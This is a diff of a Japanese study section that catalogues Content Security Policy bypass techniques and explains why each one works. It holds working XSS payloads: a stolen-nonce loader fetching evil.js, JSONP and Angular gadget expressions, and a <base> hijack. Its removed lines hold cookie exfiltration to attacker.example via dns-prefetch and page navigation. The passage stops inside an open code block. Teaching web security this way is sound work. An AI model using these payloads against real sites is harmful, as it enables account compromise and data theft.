@@ -1,147 +1,292 @@
 ## CSPバイパス総まとめ（joaxcar / Beyond XSS / HackTricks）
 
-CSP（Content Security Policy、コンテンツセキュリティポリシー）は「ブラウザ側で強制されるホワイトリスト型の実行制御機構」で、XSS（クロスサイトスクリプティング）が成立した後の**最後の防波堤**として機能する。素朴な反射型XSSを理解した読者が次に踏み込むべきなのが、この防波堤をどう突破するか、あるいはそもそも突破しなくても情報を盗めてしまうケースがあるという事実である。本節では実際のバグバウンティ報告（joaxcar）、体系的なチートシート的教材（Beyond XSS）、実務リファレンス（HackTricks）の3つの視点からCSPバイパスを整理する。
+CSP（Content Security Policy、コンテンツセキュリティポリシー）は「ブラウザ側で強制されるホワイトリスト型の実行制御機構」で、XSS（クロスサイトスクリプティング）が成立した後の**最後の防波堤**として機能する。素朴な反射型XSSを理解した読者が次に踏み込むべきなのが、この防波堤をどう突破するか、そもそも突破しなくても情報が漏れてしまうケースがあるという事実である。本節では、実際のバグバウンティ報告（joaxcar による portswigger.net のバイパス）、体系的な解説教材（Beyond XSS）、実務リファレンス（HackTricks）という3つの視点から、CSPバイパスのカタログを整理する。
 
-まず前提知識を短く確認する。CSPは `Content-Security-Policy` レスポンスヘッダ（または `<meta http-equiv="Content-Security-Policy">`）で配信され、`script-src`, `default-src`, `object-src`, `base-uri`, `form-action` などのディレクティブごとに「どこから」「どうやって」リソースを読み込んでよいかを宣言する。ブラウザはHTMLパーサがDOMを構築する過程で、スクリプトタグ等のsink（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、ここでは「スクリプトとして実行される場所」全般を指す）に到達するたびに、そのリソースの取得元URLやインラインかどうかをCSPのソースリストと照合し、一致しなければブロックする。**CSPバイパスとは、この照合ロジックの「抜け」や「解釈のズレ」を突いて、ポリシーが許可しているはずのない挙動を実行させる技術群**である。バイパスの多くは「攻撃コード自体の巧妙さ」ではなく、「許可リストに載っている“信頼済み”ドメインの中に、攻撃者が乗っ取れる機能（JSONPエンドポイント、AngularJS、オープンリダイレクトなど）が存在する」という運用上の見落としを突く点に本質がある。
+隣接する節との棲み分けを先に述べておく。CSPが構造的になぜ破れやすいのかという理論（Googleの "CSP Is Dead" 論文と `strict-dynamic`）は **s4i**、スクリプトガジェット／コード再利用による「CSP違反ゼロでの任意コード実行」の実例（Truesec・PortSwigger nonce）は **s4l** で扱った。本節はそれらを踏まえたうえで、実戦で使う**バイパス手法そのものの網羅的カタログ**を提供する。
 
----
+### 前提：CSPの照合ロジックを一段深く理解する
 
-### 1. joaxcar: PortSwigger.net における Google スクリプトリソースを使った CSP バイパス
+CSPは `Content-Security-Policy` レスポンスヘッダ（または `<meta http-equiv="Content-Security-Policy">`）で配信され、`script-src`, `default-src`, `object-src`, `base-uri`, `form-action`, `connect-src` などの**ディレクティブ**ごとに「どこから」「どうやって」リソースを読み込んでよいかを宣言する。ブラウザはHTMLパーサがDOMを構築する過程で、スクリプトを実行しようとするたびに、その取得元URLやインラインかどうかを対応ディレクティブの**ソースリスト**と照合し、一致しなければブロックする。
 
-> ⚠️ **未取得の資料**: 「CSP bypass on PortSwigger.net using Google script resources」（joaxcar, 2024-02-19）は自動取得できませんでした（理由: 環境のegressプロキシにより `joaxcar.com` へのアクセスがブロックされたため。GitHub上のミラーも存在せず、代替としてWeb検索を実施し、HackerOne上の開示情報および関連ブログの要約から概要を再構成した）。詳細は必ず以下のURLからユーザーご自身でご覧ください: https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
+ソースリストで使われる主なキーワードの意味は次の通り。バイパスはこの一つ一つの「解釈の隙間」を突くので、正確に押さえておく。
 
-（以下は未取得資料の補足として、検索で得られた公開情報＋一般知識に基づく解説です）
+| キーワード | 意味 | 注意点（＝攻撃の入口になりやすい理由） |
+|---|---|---|
+| `'self'` | 同一オリジンのリソースのみ許可 | サイト内にファイルアップロードやJSONPがあると自爆する |
+| `'unsafe-inline'` | インライン `<script>`・イベントハンドラを許可 | これがあると事実上XSS防御は無い |
+| `'unsafe-eval'` | `eval()` / `Function()` 等を許可 | ライブラリのテンプレート評価が着火点になる |
+| `'nonce-xxxx'` | 指定した乱数トークンを持つインラインスクリプトのみ許可 | `strict-dynamic` が無いとホワイトリスト頼みに戻る |
+| `'strict-dynamic'` | nonce/hashで信頼されたスクリプトが動的に読み込む子スクリプトも信頼する。**ホスト名ホワイトリストを無効化する** | 正しく使えば強力だが、旧ブラウザ用フォールバックが緩いと台無し |
+| `'unsafe-hashes'` | 特定のインラインイベントハンドラをハッシュで許可 | ガジェット経由の悪用余地 |
+| `data:` | `data:` URIからの読み込みを許可 | `data:text/javascript,...` を直接注入できる |
+| `blob:` | `blob:` URLを許可 | JSで生成したBlobを実行できる |
+| `*` | data:/blob:/filesystem: 以外の全URLを許可 | 実質ホワイトリスト無効化 |
 
-**概要（2024年2月19日公開、報告者 Johan Carlsson / joaxcar、HackerOne経由でPortSwiggerに報告、報奨金1,500ドル）**
-
-PortSwigger.net が配信していたCSPの `script-src` ディレクティブには、Google Tag Manager や Google Analytics 等を動かすために `https://www.google.com` や `https://www.googletagmanager.com` のような「Googleが管理する巨大な共有ドメイン」が許可元として含まれていた。ここでの根本原因は次の**プリンシパルの誤り**である。
-
-- CSPの `script-src https://www.google.com` という記述は、「そのオリジンから配信されるあらゆるスクリプトファイル」を無条件に信頼することを意味する。
-- しかし `www.google.com` のような巨大ドメインは、検索・ウィジェット・実験的機能など無数のサブパスでJavaScriptを配信しており、その中には**任意のコードを実行できる「スクリプトガジェット」**（本来は無害な目的で書かれているが、外部から渡せるパラメータや埋め込みHTML経由で任意のJS実行に転用できるライブラリ・コード片）が紛れ込んでいる。
-- 具体的にはAngularJSのような、DOM上の属性（`ng-app`、`ng-csp` など）をテンプレートとして評価するフレームワークがGoogleドメインの許可対象パス上でホストされているケースがあり、攻撃者はXSSで注入したHTML（`<div ng-app>{{constructor.constructor('alert(1)')()}}</div>` のようなAngular式）と、CSPで許可済みのGoogleドメインから読み込んだAngularJS本体を組み合わせることで、CSPが `script-src` を制限していても最終的に任意JavaScriptを実行できてしまう。
-
-```html
-<!-- CSPが https://www.google.com/... 配下のAngularJSを許可している場合の典型例 -->
-<script src="https://www.google.com/.../angular.js"></script>
-<div ng-app ng-csp>
-  {{constructor.constructor('alert(document.domain)')()}}
-</div>
-```
-これが動く理由は、**CSPはスクリプトの「取得元（どこから来たか）」しか検証せず、「そのスクリプトが実行時にどんなAPI・機能を提供するか」は一切見ていない**からである。AngularJSはCSP的には「許可されたドメインから来た正規のスクリプト」でしかないが、実行時にはDOM上のテンプレート構文を評価してJavaScriptとして実行するインタプリタとして振る舞う。攻撃者はこの「許可されたインタプリタ」に自分の注入したマークアップを食わせることで、事実上のコード実行を得る。
-
-PortSwigger側のCSPには他にも懸念があり、修正後もjoaxcarは追加で「フォームハイジャック（form hijacking）」によるCSP回避を報告している。これは `form-action` ディレクティブが十分に制限されていない場合、攻撃者がXSSで `<form action="https://attacker.example">` を注入し、既存の入力フィールド（ログインフォームなど）の送信先を書き換えることで、CSPの `script-src` を一切破らずに認証情報や機密情報を外部に持ち出す手法である（詳細はPortSwigger Researchの "Using form hijacking to bypass CSP" 参照）。
-
-**教訓（原理レベル）**: CSPのホワイトリストは「ドメインの信頼」を「そのドメイン上の全パスの安全性」に暗黙に拡大してしまう。巨大なCDNやアナリティクスドメイン（Google, Cloudflare, jsDelivr等）を安易に許可すると、そのドメイン上でホストされている無数のライブラリの中から「スクリプトガジェット」を探し出されるだけでバイパスされる。対策は、許可ドメインを最小化し、可能な限り `strict-dynamic` + nonce/hash方式（後述）へ移行することである。
+**CSPバイパスとは、この照合ロジックの「抜け（設定漏れ）」や「解釈のズレ（パーサ差異・リダイレクト）」を突いて、ポリシーが本来許可しないはずの挙動を実行させる技術群**である。重要な洞察は、バイパスの多くが「攻撃コードの巧妙さ」ではなく、「許可リストに載っている“信頼済み”ドメインの中に、攻撃者が乗っ取れる機能（JSONPエンドポイント、AngularJS、オープンリダイレクト）が存在する」という運用上の見落としを突くという点にある。
 
 ---
 
-### 2. Beyond XSS: 一般的なCSPバイパス手法
+### 資料1：joaxcar — Googleスクリプトリソースによる portswigger.net のCSPバイパス（2024年）
 
-> ⚠️ **未取得の資料（部分的）**: 「Bypassing Your Defenses: Common CSP Bypasses」（Beyond XSS, aszx87410, Chapter 2）は自動取得できませんでした（理由: `aszx87410.github.io` が環境のegressプロキシでブロックされ、GitHubリポジトリ `aszx87410/beyond-xss` 内の該当Markdownファイルも直接のパス推測では404となり取得できなかったため。Web検索による断片的な要約のみ確認できている）。正確な全文は以下のURLからユーザーご自身でご覧ください: https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
+Johan Carlsson（joaxcar）は2024年2月、CSPで守られた **portswigger.net 本体**（PortSwigger社の公式サイト）で、nonceベースのCSPを完全にバイパスして任意スクリプト実行に至った事例を報告した。これは「nonceがあってもホワイトリスト依存だと破れる」という s4i/s4l の理論を、標的が防御側のプロ企業自身であるという象徴的な形で実証したケースである。
 
-（以下は検索で得られた要約情報＋一般知識に基づく体系的な補足解説です）
+#### 弱点の構図：nonce + ホワイトリスト、ただし `strict-dynamic` なし
 
-Beyond XSSのCSPバイパス章は、CSPを「XSSに対する第二の防衛線」と位置づけた上で、代表的なバイパスパターンを類型化して紹介している。確認できた要点と、それを補う一般的な技術解説は以下の通り。
+portswigger.net のCSPは、インラインスクリプトを `nonce` で制御しつつ、reCAPTCHA のために Google のスクリプトリソース（`https://www.google.com/recaptcha` と `https://www.gstatic.com/recaptcha`）をホスト名で**ホワイトリスト**していた。ここに `'strict-dynamic'` が付いていなかったことが致命的だった。`strict-dynamic` が無いnonce CSPでは、**ホワイトリストされたホストのURLはnonceが無くても読み込めてしまう**。つまりnonceで固めたつもりでも、実質は「Googleのリソースなら何でも許可」の状態に戻っていた。
 
-**(a) オープンリダイレクト + JSONPの組み合わせ**
+そしてGoogleが reCAPTCHA と一緒に配信していたバンドルの中には、**AngularJS が含まれていた**。AngularJSは「CSPの定番ブレーカー（classic CSP breaker）」と呼ばれ、ページに読み込ませるだけで、Angularのテンプレート式評価を通じてサンドボックス外のJSを実行できてしまうことで知られる。
 
-CSPの `script-src` に許可されたドメイン（例: `accounts.google.com`）に**オープンリダイレクト**（任意の外部URLへ転送してしまう脆弱な機能、例: `/logout?continue=<任意URL>`）が存在する場合、攻撃者は次のようなURLを `<script src="...">` に指定できる。
+#### ステップ1：Angularガジェットで最初のJS実行を得る
 
-```html
-<script src="https://accounts.google.com/logout?continue=https://attacker.example/evil.js"></script>
-```
-
-これが動く理由は、**CSPのソース照合はリクエスト送信前のURL（＝スクリプトタグに書かれたURL）のホスト名だけを見て許可判定を行い、その後サーバ側やHTTP 30x応答で発生するリダイレクト先までは検証しないブラウザの実装が存在する**ためである（仕様上はCSP3でリダイレクト後のURLも再検証すべきとされているが、実装や設定によっては初期リクエストのホストだけで通過してしまうケースが報告されてきた）。結果として、許可ドメインのオープンリダイレクトを踏み台に、任意ドメインからのスクリプト読み込みへとすり替えられる。
-
-さらにこれをJSONPエンドポイント（`?callback=xxx` のようなパラメータでJavaScriptの関数呼び出し形式のレスポンスを返すAPI）と組み合わせると、リダイレクトすら不要な場合がある。許可済みドメインが `https://trusted.example/api/data?callback=alert(document.cookie)//` のようなJSONPを提供していれば、そのレスポンスは `alert(document.cookie)//({...})` という**そのまま実行可能なJavaScript文**になる。CSPは「trusted.exampleから来たスクリプトである」ことしか検証しないため、中身が攻撃者の指定した任意コードであっても素通りする。
+まず、ホワイトリストされたGoogleドメインからAngularJS入りのスクリプトを読み込み、Angularのディレクティブ（`ng-on-error` などのイベント式）を使って初弾のコード実行を起こす。
 
 ```html
-<script src="https://trusted.example/jsonp?callback=alert(document.domain)//"></script>
+<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
+<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
 ```
 
-**(b) `base-uri` 未設定を突いた `<base>` タグインジェクション（Dangling Markup的手法）**
+**なぜ動くか**：`<script src=...>` はホワイトリスト済みホストなのでCSPを通る。読み込まれたバンドルにAngularJSが含まれるため、ページ内のAngularディレクティブ（`ng-on-error`）が有効化される。`<img src=x>` は読み込みに失敗して `error` イベントを発火し、その式 `$event.target.ownerDocument.defaultView.alert(1)` がAngularの式エバリュエータで評価される。式はインラインスクリプトではなく「属性値の中の文字列」なので、`script-src 'nonce-...'` のインライン判定に引っかからない。これがAngularをCSPブレーカーたらしめる核心である。
 
-CSPで `base-uri` ディレクティブが明示されていない場合、攻撃者がHTMLインジェクション（完全なXSSでなくてもタグ挿入ができれば足りる）で以下を注入できる。
+#### ステップ2：nonceを盗み出す
 
-```html
-<base href="https://attacker.example/">
-```
+Angular式の中からは通常のDOM APIが使える。CSPのnonceはDevToolsのAttributes表示では隠されるものの、**JavaScriptからは `element.nonce` プロパティで読み取れる**（DOM上の `[nonce]` セレクタでも要素は選択できる）。
 
-`<base>` は文書内のすべての相対URL（`<script src="app.js">` のような相対パス指定）の基準を書き換える。これにより、ページが本来 `/app.js`（＝自サイト）を読み込むつもりで書いていたコードが、実際には `https://attacker.example/app.js` を読み込んでしまう。これは**HTMLパーサが `<base>` をスクリプト実行前の早い段階（head解析時）で処理し、以降のURL解決に影響を与える**という、DOM構築の順序に起因する挙動である。CSPの `script-src` が正規オリジンを許可していても、その「正規オリジン」の相対パス解決先そのものを攻撃者が乗っ取ってしまう点がポイントで、`base-uri 'self'`（または `'none'`）を明示しない限り防げない。
-
-**(c) Report-Onlyモードの誤運用**
-
-`Content-Security-Policy-Report-Only` ヘッダは、違反を検知してレポートを送信するだけで、**実際のブロックを一切行わない**。開発中の設定確認用ヘッダを本番の `Content-Security-Policy`（強制モード）と混同・併用ミスすると、見た目上は「CSPが設定されている」のに実際には何も制限されておらず、通常のXSSペイロードがそのまま素通りする。これはCSPバイパスというより「CSPが実質的に存在しない」状態だが、監査で見落とされやすい典型的な設定ミスとして紹介されている。
-
-> 出典: Bypassing Your Defenses: Common CSP Bypasses — Beyond XSS — https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
-
----
-
-### 3. HackTricks: CSPバイパス総覧
-
-HackTricksの本ページは取得に成功した。CSPの仕組みの整理から実践的なバイパス手法まで非常に広範に扱われており、以下に主要トピックを整理する。
-
-**CSPの基本**
-
-CSPは `script-src`（JS読み込み元）、`default-src`（未指定ディレクティブへのフォールバック）、`connect-src`（`fetch`/`XMLHttpRequest`/WebSocket接続先）、`frame-src`（iframe読み込み元）、`form-action`（フォーム送信先）、`object-src`（`<object>`/`<embed>`/`<applet>`）、`base-uri`（`<base>`要素で指定可能なURL）などのディレクティブで構成される。`Content-Security-Policy-Report-Only` は強制せずレポートのみを行う点は前述の通り。
-
-**脆弱なポリシーごとのバイパス手法**
-
-- **`'unsafe-inline'` が有効な場合**: そもそもインラインスクリプトの実行が許可されているため、通常のHTMLインジェクションから直接 `<script>alert(1)</script>` を注入すればよく、CSPは実質無力化されている。
-- **`'unsafe-eval'` が有効な場合**: `eval()`, `new Function()`, `setTimeout("文字列", …)` などの「文字列をコードとして評価する」API群がブロックされない。`data:` スキームと組み合わせ、`<script src="data:text/javascript;base64,...">` のようにBase64エンコードしたJSをdata URIとして読み込ませる手口も紹介される。これは `unsafe-eval` 自体はdata URI経由の `<script src>` の可否に直接関係しないディレクティブだが、`script-src` の値に `data:` が許可指定として含まれているような構成ミスと合わせて悪用されるケースを指す。
-- **ワイルドカード（`*`）指定**: `script-src *` のように無制限指定、あるいは `https:` のようなスキームだけの指定は、攻撃者が完全に自由なドメインからスクリプトを読み込めることを意味し、CSPとして機能していない。
-- **`strict-dynamic` の誤解**: `strict-dynamic` は「nonceまたはhashで許可された信頼済みスクリプトが、動的に（`document.createElement('script')`等で）生成した新しいスクリプトタグは、そのURLに関わらず自動的に信頼する」という委譲の仕組みである。これは元々「ドメインホワイトリスト方式の弱点（前述のjoaxcarの例のようなガジェット問題）を解消するため」に導入された仕様だが、逆に**信頼済みスクリプト自身にXSS類似の脆弱性（例えばそのスクリプトが外部入力をもとに新しいscriptタグを組み立ててしまうコード）があれば、その信頼を丸ごと悪用される**という新たなリスクを生む。
-- **ファイルアップロード + `'self'`**: アップロードされたファイルが自サイト（`'self'`）配下に置かれ、かつサーバがMIMEタイプやURLパスの拡張子判定を誤る場合、`picture.png.js` のような二重拡張子ファイルをアップロードし、`<script src="/uploads/picture.png.js">` として読み込ませることで、`'self'` 制限下でもJS実行に成功する。
-- **サードパーティエンドポイント悪用**: 前述のAngularJS + `ng-app`/`ng-csp` の式評価パターンに加え、Google reCAPTCHAのスクリプト（`recaptcha/about/js/main.min.js`）が提供するAngular的な `ng-on-error` ディレクティブを介した `alert()` 実行例や、Google検索サジェストのJSONPエンドポイント（`google.com/complete/search?...&callback=alert#1`）を `<script src>` に指定してコード実行させる例が挙げられている。いずれも「許可ドメイン上に存在する、開発者が意図しない機能拡張点（テンプレートエンジンやコールバックパラメータ）」を突く点で共通している。
-- **Relative Path Overwrite (RPO)**: `<script src="https://example.com/scripts/react/..%2fangular%2fangular.js">` のように、URLエンコードしたパストラバーサル（`%2f` は `/` のURLエンコード表現）をスクリプトのパスに混ぜる。CSPの照合はオリジン単位で行われ、パスの正規化前後の差異までは厳密にチェックされないブラウザ実装があるため、`../` に相当する記述で許可オリジン配下の別のスクリプト（本来読み込むはずのなかった脆弱なライブラリ）にすり替えられる。
-- **`base-uri` 欠如の悪用**: Beyond XSSの節で述べた `<base href="https://attacker.example/">` インジェクションと同様の手法。
-- **nonce再利用/漏洩**: 同一ページ内の別の場所（例えば別のiframe経由でDOMアクセスできる箇所）に置かれた正規の `nonce` 属性値を読み取り、それを攻撃者が新しく生成する `<script>` タグの `nonce` にコピーして貼り付けることで、CSPのnonce検証（「このリクエストに使われたnonceが、レスポンスヘッダで指定されたnonceと一致するか」）をすり抜ける。これはnonceの値そのものは正しいので検証上は「合法」なスクリプトとして扱われてしまうことに起因する。
-- **許可元でのリダイレクト**: CSPでパスまで絞った許可（例: `script-src https://www.google.com/a/b/c/d`）をしていても、そのURLが302リダイレクトで別のパス・別のリソースへ転送する場合、多くのブラウザ実装は「最初にマッチしたオリジンさえ許可条件を満たせばよい」とみなし、リダイレクト先のパスまでは再検証しない（前述のBeyond XSSのオープンリダイレクト事例と同根の問題）。
-- **Service Worker経由の `importScripts` 悪用**: Service Worker内で使われる `importScripts()` はCSPの `script-src` 制限の対象外として扱われる実装上のギャップが存在し、Service Workerを登録できる状況（`self` オリジンへの書き込み権限がある等）ではCSPをすり抜けてコードを読み込める。
-- **ポリシー注入によるCSP破壊**: HTTPヘッダインジェクションなどでCSPヘッダ自体に追記できる状況では、ブラウザ実装依存の挙動を突いて既存ポリシーを無力化できる。例としてChromeでは `script-src-elem *; script-src-attr *` のような、より詳細度の高い（fetch directiveの中でも要素・属性別に分かれた）ディレクティブを追加注入すると、それが `script-src` の指定を実質的に上書き・無効化してしまう仕様上の優先順位（`script-src-elem`/`script-src-attr` は `script-src` よりも詳細度が高く優先される）が悪用される。Edgeでは `;_` のような無効なトークンを挿入すると、パーサの誤動作でポリシー全体が破棄されるという実装バグ的な事例も紹介されている。
-
-**CSPが有効なままでの情報窃取（バイパスせずに漏洩させる手法）**
-
-XSSは成立したがCSPで外部への `fetch`/`script`/`img` 読み込みが厳密にブロックされている場合でも、CSPのディレクティブがカバーしていない経路を使えば情報を持ち出せる。
-
-- **DNSプリフェッチ悪用**: `<link rel="dns-prefetch" href="//<盗みたいデータ>.attacker.example">` を注入すると、ブラウザは表示パフォーマンス向上のためにこのホスト名を事前にDNS解決しようとする。DNSクエリの送信自体はCSPの `connect-src`/`img-src` 等のフェッチ系ディレクティブの制御対象外であることが多く、機密情報（セッションIDの断片など）をサブドメインに埋め込んでDNSクエリとして外部（攻撃者が権威DNSサーバを持つドメイン）に送信できる。
 ```javascript
-var sessionid = document.cookie.split("=")[1] + "."
-document.body.innerHTML += '<link rel="dns-prefetch" href="//' + sessionid + 'attacker.example">'
+const nonce = document.querySelector("[nonce]").nonce;
 ```
-これが機能する理由は、**CSPのフェッチ系ディレクティブはHTTP/HTTPSやWebSocketなど「アプリケーション層のリクエスト」を制御対象として設計されており、ブラウザが内部的に行うDNS解決という「名前解決レイヤーの動作」までは制御範囲に含まれていない**ためである。
-- **WebRTCのSTUN/ICE経由の漏洩**: `RTCPeerConnection` でSTUNサーバへの接続を試みる際に発生する通信も、CSPの `connect-src` の対象外となる実装・バージョンが存在し、STUNサーバのホスト名部分にデータを埋め込んで外部に送信する手口が使われてきた（ブラウザベンダ側でも `connect-src` へのWebRTC組み込みが順次進められているため、対象ブラウザ・バージョンによって有効性が異なる点に注意）。
-- **`document.location` による直接遷移**: CSPは「リソースの読み込み」を制御するものであり、`navigate-to` ディレクティブ（実装が限定的）を設定していない限り、`document.location = "https://attacker.example/?" + secret` のようなページ遷移そのものはブロックされないブラウザが多い。これはCSPの設計思想が「埋め込みリソースの出所検証」であって「ユーザーの能動的なナビゲーション」とは別物として扱われてきた歴史的経緯による。
 
-**PHPの実装上の欠陥を突いたCSPヘッダそのものの無効化**
+**なぜ動くか**：ブラウザはnonce値をHTML属性としては露出しない（属性ゲッターでは空になる）が、IDLプロパティ `HTMLScriptElement.nonce` としてはスクリプトから参照可能なまま残す。この「属性は隠すがプロパティは残す」という設計上の非対称が、同一オリジンで既に走っているスクリプト（ここではAngular経由の攻撃者コード）にとっては抜け穴になる。
 
-サーバサイドの実装（特にPHP）に起因する、CSPヘッダ自体を消し飛ばす手法も紹介されている。
+#### ステップ3：盗んだnonceで任意スクリプトを注入して昇格
 
-- 1001個以上のGETパラメータを送信すると、PHPが警告（notice/warning）を出力し、それがレスポンスボディに先行して出力されてしまう場合、`header()` 関数（レスポンスヘッダを設定するPHP関数）呼び出し前に本文が出力されたことになり「headers already sent」エラーとなってヘッダ設定自体が失敗する。
-- `max_input_vars`（PHPのデフォルトは1000）を超える数の入力変数を送ると同様の警告が発生し、CSPヘッダの送信に失敗する。
+nonceさえ手に入れば、正規のインラインスクリプトになりすまして外部スクリプトを注入できる。`unsafe-eval` が無くても関係ない。
+
+```html
+<img src=x ng-on-error='doc=$event.target.ownerDocument;
+a=doc.defaultView.top.document.querySelector("[nonce]");
+b=doc.createElement("script");
+b.src="//example.com/evil.js";
+b.nonce=a.nonce; doc.body.appendChild(b)'>
 ```
-curl "http://example.com/?xss=<svg/onload=alert(1)>&A=1&A=2&...(1000個以上)"
-```
-- レスポンスバッファ（PHPのデフォルトのoutput_buffering相当、目安として4096バイト程度）を大量の警告メッセージで埋め尽くすと、CSPヘッダがレスポンスバッファからあふれて実際に送出されるレスポンスに含まれなくなる。
 
-これらはいずれも「アプリケーションのエラーハンドリングの不備によって、セキュリティヘッダの送信自体が失われる」という、CSPロジック外の攻撃面である点に注意したい。
+**なぜ動くか**：新しく作った `<script>` 要素に正規の `nonce` を設定して `body` に追加すると、ブラウザはそのスクリプトを「nonce一致＝許可済み」と判定して実行する。これでホワイトリスト外の任意オリジン（`//example.com/evil.js`）から任意コードを実行でき、部分的なXSSが完全なXSSへ昇格する。
 
-**検証・防御のためのツールとベストプラクティス**
+#### 影響・報奨・修正
 
-- チェックツール: Google製の `CSP Evaluator`（csp-evaluator.withgoogle.com）、`cspvalidator.org`、ポリシー自動生成の `csper.io` などが実務でよく使われる。
-- 防御の骨子は次の通りである。
-  1. `'unsafe-inline'` と `'unsafe-eval'` を避ける。
-  2. ドメインホワイトリスト方式ではなく、`nonce`（レスポンスごとに生成するワンタイムのランダムトークン）または `hash`（許可するインラインスクリプトのSHA値）と `'strict-dynamic'` を組み合わせる方式に移行する。これによりjoaxcarの事例のような「許可ドメイン上のガジェット探索」を無効化できる。
-  3. `object-src 'none'` で古いプラグイン（Flash等）ベクタを遮断する。
-  4. `base-uri 'self'`（または `'none'`）を必ず明示し、`<base>` インジェクションを封じる。
-  5. `form-action 'self'` を設定し、フォームハイジャックを防ぐ。
-  6. サードパーティドメインを許可リストに入れる際は、そのドメイン上に存在する全パスの安全性まで保証できないことを前提に、可能な限り許可対象を細く・具体的なパスまで絞り込む（ただし前述のリダイレクト・RPOのようにパス指定も万能ではない点に留意）。
-  7. アップロードファイルのMIMEタイプ・拡張子検証を厳格化し、`'self'` 配下にユーザ制御コンテンツを置く場合は別オリジン（サブドメイン分離等）に退避する。
+完全なCSPバイパスにより、限定的なHTMLインジェクションから任意コード実行へ到達した。PortSwiggerはこのCSPバイパスを受理（$1,000）、さらに欠けていた `form-action` ディレクティブも指摘され（$500）、両方を修正した。教訓は明快で、**nonceベースCSPには `'strict-dynamic'` を必ず併用し、ホスト名ホワイトリスト（とりわけAngularJSやJSONPを配りうるGoogle系ドメイン）に依存しない**こと。
 
-> 出典: Content Security Policy (CSP) Bypass — HackTricks — https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
+> 出典: CSP bypass on portswigger.net using Google script resources — https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
 
 ---
 
-### まとめ: 3資料を貫く共通原理
+### 資料2：Beyond XSS — CSPバイパスの体系
 
-joaxcar、Beyond XSS、HackTricksの3資料に共通するのは、**CSPバイパスの大半が「CSPのソース照合ロジックが検証しているもの（オリジン・パス・nonce・hash）」と「実際に安全性を左右するもの（そのリソースが実行時に何をするか、リダイレクトやエンコーディングでURLがどう解決されるか）」との間にあるギャップを突いている**という点である。ドメインホワイトリスト方式は運用が直感的である反面、許可ドメイン上の未知のガジェットやオープンリダイレクト・JSONPエンドポイントに脆弱であり、これが `nonce`/`hash` + `strict-dynamic` という現代的な設計への移行が推奨される最大の理由になっている。読者は個々のペイロードを暗記するのではなく、「このCSP設定は何を検証していて、何を検証していないのか」を常に問い直す視点を持つことが、CSPバイパスを体系的に理解する近道である。
+Huli（@aszx87410）の教材 Beyond XSS のCSP章は、「XSSに対する第二の防衛線」としてのCSPを、`script-src` のソース許可評価という視点から系統立てて解体する。実務でよく効く6つのパターンを、原典のペイロードで示す。
+
+#### (1) 許可ドメインが広すぎる（CDNまるごと許可）
+
+`script-src https://unpkg.com/` のようにCDNのオリジンをまるごと許可すると、そのCDN上に置かれた**悪意あるライブラリ**を読み込めてしまう。
+
+```html
+<script src="https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js"></script>
+<br csp="alert(1)">
+```
+
+**なぜ動くか**：`unpkg.com` はnpmの任意パッケージをそのまま配信する。攻撃者が公開した `csp-bypass` パッケージは、独自属性 `csp="..."` の中身をJS式として評価するミニインタプリタ（`sval`）を含む。CSPは「unpkg.com由来のスクリプト」を許可しているだけなので、その中身が攻撃者製でも通る。**防御**は「パスまで完全指定する」こと。`https://unpkg.com/` ではなく `https://unpkg.com/react@16.7.0/` のようにバージョン付きの厳密なパスを書く。
+
+#### (2) `base-uri` 未指定 → `<base>` タグによる相対パス乗っ取り
+
+nonceで守っていても、`base-uri` を指定していないと `<base>` タグで相対URLの基準を攻撃者サーバに向けられる。
+
+```html
+<meta http-equiv="Content-Security-Policy"
+  content="default-src 'none'; script-src 'nonce-abc123';">
+<base href="https://attacker.com/">
+<script nonce=abc123 src="app.js"></script>
+```
+
+**なぜ動くか**：`<script src="app.js">` は相対URLなので、解決の基準が `<base href>` に従う。攻撃者が `<base href="https://attacker.com/">` を注入できれば、`app.js` は `https://attacker.com/app.js` から読み込まれる。nonceは一致しているのでCSPは通ってしまう。**防御**は `base-uri 'none'`（または `'self'`）を必ず入れること。
+
+#### (3) 許可ドメイン上のJSONPエンドポイント
+
+ホワイトリストされたドメインに、コールバック名を検証しないJSONPエンドポイントがあると、そのコールバック引数に任意コードを注入できる。
+
+```html
+<meta http-equiv="Content-Security-Policy"
+  content="script-src https://www.google.com https://www.gstatic.com">
+<script src="https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//"></script>
+```
+
+サーバは次のようなレスポンスを返す。
+
+```javascript
+alert(1);//([{id: 1, name: 'user01'}])
+```
+
+**なぜ動くか**：JSONP（JSON with Padding）は「JSONを指定コールバック関数の引数に包んで返す」仕組み。コールバック名 `jsonp=alert(1)//` がそのままレスポンス冒頭に出力され、末尾の `//` で残りのJSONをコメントアウトするため、`alert(1);` という有効なJSが `www.google.com` オリジンから配信される＝CSP的には完全に正規。**防御**はパスを絞る（`https://www.google.com/recaptcha/` など）とともに、許可ドメインをJSONBeeのようなリストで監査し、既知のJSONP穴が無いか確認すること。
+
+#### (4) コールバックが制限されたJSONP → SOME（Same-Origin Method Execution）
+
+コールバック名が英数字とドットに制限されている場合でも、既存のページ機能を鎖状に呼び出す **SOME攻撃** に持ち込める。
+
+```javascript
+?callback=document.body.firstElementChild.nextElementSibling.click
+```
+
+**なぜ動くか**：任意JSが書けなくても、`a.b.c.method` 形式のメソッド参照は英数字とドットだけで表現できる。JSONPがそれを関数として呼ぶと、ページ上の要素（例：管理操作ボタン）の `click()` などが攻撃者の意図で発火する。WordPressプラグインのインストール攻撃事例として知られる。
+
+#### (5) サーバサイドリダイレクトによるパス制限のすり抜け
+
+CSPの**パス指定はリダイレクト後には再チェックされない**という仕様を突く。
+
+```html
+<meta http-equiv="Content-Security-Policy"
+  content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
+<script src="http://localhost:5555/301"></script>
+```
+
